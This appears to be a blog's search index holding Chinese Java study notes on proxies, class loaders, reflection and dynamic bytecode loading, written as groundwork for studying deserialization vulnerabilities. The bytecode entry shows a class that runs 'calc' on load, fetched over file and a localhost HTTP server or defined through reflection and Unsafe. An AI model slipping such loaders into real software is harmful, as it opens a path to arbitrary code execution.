<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java代理</title>
    <url>/2023/09/10/Java%E5%AD%A6%E4%B9%A0/Java%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="0x00-静态代理"><a href="#0x00-静态代理" class="headerlink" title="0x00 静态代理"></a>0x00 静态代理</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li>在程序运行前已经存在代理类</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="接口类"><a href="#接口类" class="headerlink" title="接口类"></a>接口类</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="实现类、被代理类"><a href="#实现类、被代理类" class="headerlink" title="实现类、被代理类"></a>实现类、被代理类</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在查询&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="代理类"><a href="#代理类" class="headerlink" title="代理类"></a>代理类</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImplProxy</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span>&#123;</span><br><span class="line">    <span class="comment">//目标类对象</span></span><br><span class="line">    <span class="keyword">private</span> StudentServiceImpl studentService;</span><br><span class="line">    <span class="comment">//通过构造器获取目标类</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">StudentServiceImplProxy</span><span class="params">(StudentServiceImpl studentService)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.studentService = studentService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新增方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除学生&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findName</span><span class="params">()</span> &#123;</span><br><span class="line">        studentService.findName();</span><br><span class="line">        deleteName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProxy</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testProxy</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//被代理对象</span></span><br><span class="line">        <span class="type">StudentServiceImpl</span> <span class="variable">studentService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StudentServiceImpl</span>();</span><br><span class="line"><span class="comment">//        studentService.findName();</span></span><br><span class="line">        <span class="type">StudentServiceImplProxy</span> <span class="variable">studentServiceImplProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StudentServiceImplProxy</span>(studentService);</span><br><span class="line">        studentServiceImplProxy.findName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">正在查询</span><br><span class="line">删除学生</span><br></pre></td></tr></table></figure></div>

<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul>
<li>不利于代码拓展，比如接口中新添加一个抽象方法时，所有实现类都需要重新实现，否则报错。</li>
<li>代理对象需要创建很多。</li>
</ul>
<h1 id="0x01-动态代理"><a href="#0x01-动态代理" class="headerlink" title="0x01 动态代理"></a>0x01 动态代理</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><ul>
<li>运行期间才确定的代理</li>
</ul>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><h3 id="接口类-1"><a href="#接口类-1" class="headerlink" title="接口类"></a>接口类</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RentService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="实现类"><a href="#实现类" class="headerlink" title="实现类"></a>实现类</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">RentService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房屋出租&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="代理类-1"><a href="#代理类-1" class="headerlink" title="代理类"></a>代理类</h3><p><strong>Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</strong> </p>
<ul>
<li><strong>Proxy.newProxyInstance()</strong></li>
</ul>
<p>是 JDK 提供的一个方法，用于创建动态代理对象，拦截和处理方法调用，并可以在调用前后添加自定义的逻辑。返回一个实现了指定接口的代理对象。该代理对象会将方法调用转发给指定的 <code>InvocationHandler</code> 对象，并由 <code>InvocationHandler</code> 来处理方法调用的逻辑。这样，我们就可以在方法调用前后进行一些自定义的处理或附加操作。</p>
<ul>
<li><strong>ClassLoader loader</strong></li>
</ul>
<p>用于定义代理类的类加载器。(用代理类的加载器就行)</p>
<ul>
<li><strong>Class&lt;?&gt;[] interfaces</strong></li>
</ul>
<p>代理类需要实现的接口列表。</p>
<ul>
<li><strong>InvocationHandler h</strong></li>
</ul>
<p>一个实现了 <code>InvocationHandler</code> 接口的对象，用于拦截方法调用并定义代理逻辑。</p>
<p><strong>invoke(Object proxy, Method method, Object[] args)</strong></p>
<ul>
<li><strong>invoke()</strong></li>
</ul>
<p>我们可以在 <code>invoke()</code> 方法内部编写处理逻辑，比如在调用目标方法之前做一些额外的处理，或者根据方法名或参数类型来进行特定的操作。然后，可以通过反射机制调用真实对象的方法，完成方法调用的转发。最后，还可以通过返回值来处理方法调用的结果。需要注意的是，<code>invoke()</code> 方法的返回值是 <code>Object</code> 类型，表示被调用方法的返回值。如果被调用的方法是一个 <code>void</code> 方法，则 <code>invoke()</code> 方法的返回值应为 <code>null</code>。</p>
<ul>
<li><strong>Object  proxy</strong></li>
</ul>
<p>表示动态代理生成的代理对象。在 <code>invoke()</code> 方法中，如果需要调用代理对象的方法，可以使用这个参数</p>
<ul>
<li><strong>Method method</strong></li>
</ul>
<p>表示被调用的方法对象。通过这个参数，可以获取方法名、参数列表等方法相关的信息。</p>
<ul>
<li><strong>Object[] args</strong></li>
</ul>
<p>表示方法的参数列表。它是一个数组，包含了方法调用时传入的实际参数。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RentServiceImplProxy</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> RentService rentService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RentServiceImplProxy</span><span class="params">(RentService rentService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rentService = rentService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RentService <span class="title function_">creatProxy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                seeHouse();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">invoke</span> <span class="operator">=</span> method.invoke(rentService, args);</span><br><span class="line">                fare();</span><br><span class="line">                <span class="keyword">return</span> invoke;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">RentService</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (RentService)Proxy.newProxyInstance(RentServiceImplProxy.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;RentService.class&#125;,</span><br><span class="line">                invocationHandler);</span><br><span class="line">        <span class="keyword">return</span> proxyInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//看房</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">seeHouse</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;带房客看房&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//收中介费</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fare</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收中介费&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>另一种写法（大差不差）</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RentServiceImplProxy</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> RentService rentService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RentServiceImplProxy</span><span class="params">(RentService rentService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rentService = rentService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(rentService, args);</span><br><span class="line">        fare();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//看房</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">seeHouse</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;带房客看房&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//收中介费</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fare</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收中介费&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//动态获取代理</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">creatProxy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> Proxy.newProxyInstance(RentServiceImplProxy.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;RentService.class&#125;,</span><br><span class="line">                <span class="built_in">this</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="测试类-1"><a href="#测试类-1" class="headerlink" title="测试类"></a>测试类</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProxy</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testProxy</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">RentServiceImpl</span> <span class="variable">rentService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RentServiceImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//代理实例的调用处理程序</span></span><br><span class="line">        <span class="type">RentServiceImplProxy</span> <span class="variable">rentServiceImplProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RentServiceImplProxy</span>(rentService);</span><br><span class="line">        <span class="comment">//动态生成对应的代理类！</span></span><br><span class="line">        <span class="type">RentService</span> <span class="variable">rentService1</span> <span class="operator">=</span> (RentService) rentServiceImplProxy.creatProxy();</span><br><span class="line">        rentService1.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">带房客看房</span><br><span class="line">房屋出租</span><br><span class="line">收中介费</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Java学习</category>
      </categories>
      <tags>
        <tag>Java代理</tag>
      </tags>
  </entry>
  <entry>
    <title>Java动态加载字节码</title>
    <url>/2023/09/15/Java%E5%AD%A6%E4%B9%A0/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<h1 id="0x00-什么是字节码"><a href="#0x00-什么是字节码" class="headerlink" title="0x00 什么是字节码"></a>0x00 什么是字节码</h1><h1 id="0x01-URLClassLoader"><a href="#0x01-URLClassLoader" class="headerlink" title="0x01 URLClassLoader"></a>0x01 URLClassLoader</h1><ul>
<li>CalcTest.java</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalcTest</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoadClassTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///F:\\tmp\\classes\\&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; c = urlClassLoader.loadClass(<span class="string">&quot;CalcTest&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="http-协议"><a href="#http-协议" class="headerlink" title="http:&#x2F;&#x2F;协议"></a>http:&#x2F;&#x2F;协议</h2><p>在**.class**文件对应的文件目录下起一个HTTP服务</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -m http.server <span class="number">9999</span></span><br></pre></td></tr></table></figure></div>

<p>尝试访问</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoadClassTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:9999/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; c = urlClassLoader.loadClass(<span class="string">&quot;CalcTest&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="jar-协议"><a href="#jar-协议" class="headerlink" title="jar:&#x2F;&#x2F;协议"></a>jar:&#x2F;&#x2F;协议</h2><h1 id="0x02-ClassLoader-defineClass"><a href="#0x02-ClassLoader-defineClass" class="headerlink" title="0x02 ClassLoader.defineClass"></a>0x02 ClassLoader.defineClass</h1><ul>
<li>字节码加载动态类</li>
<li>private</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoadClassTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(systemClassLoader, <span class="string">&quot;CalcTest&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-Unsafe-defineClass"><a href="#0x03-Unsafe-defineClass" class="headerlink" title="0x03 Unsafe.defineClass"></a>0x03 Unsafe.defineClass</h1><ul>
<li>字节码加载动态类</li>
<li>public，但是类不能直接生成</li>
<li>Spring里面可以直接生成</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoadClassTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; c = unsafe.defineClass(<span class="string">&quot;CalcTest&quot;</span>, code, <span class="number">0</span>, code.length, systemClassLoader, <span class="literal">null</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>0x04 Template</p>
]]></content>
      <categories>
        <category>Java学习</category>
      </categories>
      <tags>
        <tag>Java动态加载字节码</tag>
      </tags>
  </entry>
  <entry>
    <title>Java类加载器</title>
    <url>/2023/09/15/Java%E5%AD%A6%E4%B9%A0/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
    <content><![CDATA[<h1 id="0x00-什么是类加载器"><a href="#0x00-什么是类加载器" class="headerlink" title="0x00 什么是类加载器"></a>0x00 什么是类加载器</h1><p>在Java中，类加载器（ClassLoader）是负责将.class文件或其他形式的字节码数据加载到Java虚拟机（JVM）中，并定义生成相应类的方法。Java的类加载器遵循双亲委派模型，它负责从不同的来源加载类，包括本地文件系统、网络等。</p>
<h1 id="0x01-类加载器的作用"><a href="#0x01-类加载器的作用" class="headerlink" title="0x01 类加载器的作用"></a>0x01 类加载器的作用</h1><p>将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口</p>
<h1 id="0x02-什么是类缓存"><a href="#0x02-什么是类缓存" class="headerlink" title="0x02 什么是类缓存"></a>0x02 什么是类缓存</h1><p>标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到类加载器中，它将维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些Class对象。</p>
<h1 id="0x03-类的加载器类型"><a href="#0x03-类的加载器类型" class="headerlink" title="0x03 类的加载器类型"></a>0x03 类的加载器类型</h1><h2 id="引导类加载器"><a href="#引导类加载器" class="headerlink" title="引导类加载器"></a>引导类加载器</h2><p>Bootstrap Class Loader，也称为根加载器，<strong>负责加载Java的核心类库</strong>，如<code>rt.jar</code>等。它是虚拟机的一部分，由C++实现，并不是一个Java类。该加载器无法直接获取。</p>
<h2 id="扩展类加载器"><a href="#扩展类加载器" class="headerlink" title="扩展类加载器"></a>扩展类加载器</h2><p>Extension Class Loader，负责加载Java扩展库，位于<code>&lt;JAVA_HOME&gt;/lib/ext</code>目录下的jar包。它是由Java编写的。</p>
<h2 id="应用类加载器"><a href="#应用类加载器" class="headerlink" title="应用类加载器"></a>应用类加载器</h2><p>Application Class Loader，也称为系统类加载器，负责加载应用程序的类。它是ClassLoader类的子类，并由Java编写。也是最常用的加载器。</p>
<h2 id="获取类加载器"><a href="#获取类加载器" class="headerlink" title="获取类加载器"></a>获取类加载器</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取系统类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(systemClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取应用类加载器的父类加载器---&gt;扩展类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> systemClassLoader.getParent();</span><br><span class="line">        System.out.println(parent);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取扩展类加载器父类加载器---&gt;根加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent1</span> <span class="operator">=</span> parent.getParent();</span><br><span class="line">        System.out.println(parent1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试当前类是哪个加载器加载的</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.classloader.TestClassLoader&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(classLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试JDK内置的类是谁加载的</span></span><br><span class="line">        <span class="comment">//内置的是引导类加载器</span></span><br><span class="line">        classLoader = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(classLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得系统类加载器可以加载的路径</span></span><br><span class="line"><span class="comment">//        System.out.println(System.getProperty(&quot;java.class.path&quot;));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>输出</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">sun.misc.Launcher$AppClassLoader@18b4aac2</span><br><span class="line">sun.misc.Launcher$ExtClassLoader@677327b6</span><br><span class="line"><span class="literal">null</span></span><br><span class="line">sun.misc.Launcher$AppClassLoader@18b4aac2</span><br><span class="line"><span class="literal">null</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-双亲委派机制"><a href="#0x04-双亲委派机制" class="headerlink" title="0x04 双亲委派机制"></a>0x04 双亲委派机制</h1><p>当一个类加载器收到加载请求时，它首先将加载任务委派给其父类加载器进行尝试。只有当父加载器无法加载时，才由当前类加载器</p>
<p>自己来尝试加载。这种层次结构保证了类的安全性和隔离性。如果自定义类加载器想要打破这个模型，可以覆盖加载逻辑。</p>
<p>特点：</p>
<ul>
<li>每个 class 都有对应的 ClassLoader</li>
<li>除了 Bootstrap ClassLoader，每个 ClassLoader 都有一个 Parent ClassLoader</li>
<li><strong>对于一个类加载的请求，总是先委派给 Parent ClassLoader 来进行加载</strong></li>
<li>对于用户自定义的类加载器，默认的 Parent ClassLoader 是 AppClassLoader</li>
</ul>
<h1 id="0x05-类的加载过程"><a href="#0x05-类的加载过程" class="headerlink" title="0x05 类的加载过程"></a>0x05 类的加载过程</h1><ul>
<li>加载</li>
</ul>
<p>将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后生成一个代表这个类的java.lang.Class对象。</p>
<ul>
<li>链接</li>
</ul>
<p>将Java类的二进制代码合并到JVM的运行状态之中的过程。</p>
<p>​	验证：</p>
<p>​	确保加载的类信息符合JVM规范，没有安全方面的问题。</p>
<p>​	准备：</p>
<p>​	正式为类变量（static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。</p>
<p>​	解析：</p>
<p>​	虚拟机常量池内的符号引用（常量名）替换为直接引用（地址）的过程。</p>
<ul>
<li>初始化</li>
</ul>
<p>执行类构造器<clinit>()方法的过程。类构造器<clinit>()方法是由编译期自动收集类中所有类变量的赋值动作和静态代码块中的语句合并产生的。（类构造器是构造类信息的，不是构造该类对象的构造器）</p>
<p>当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。</p>
<p>虚拟机会保证一个类的<clinit>()方法在多线程 环境中被正确加锁和同步。</p>
]]></content>
      <categories>
        <category>Java学习</category>
      </categories>
      <tags>
        <tag>Java类加载器</tag>
      </tags>
  </entry>
  <entry>
    <title>反射</title>
    <url>/2023/09/08/Java%E5%AD%A6%E4%B9%A0/Java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在学习<strong>Java</strong>反序列化漏洞时，发现需要用到反射的知识，所以根据网上师傅们的文章，简单总结下反射的简单利用方法</p>
<h1 id="0x01-什么是反射"><a href="#0x01-什么是反射" class="headerlink" title="0x01 什么是反射"></a>0x01 什么是反射</h1><ul>
<li><p>加载类，并允许以编程的方式解剖类中的各种成分(成员变量、方法、构造器等)。</p>
</li>
<li><p>可以破坏封装性</p>
</li>
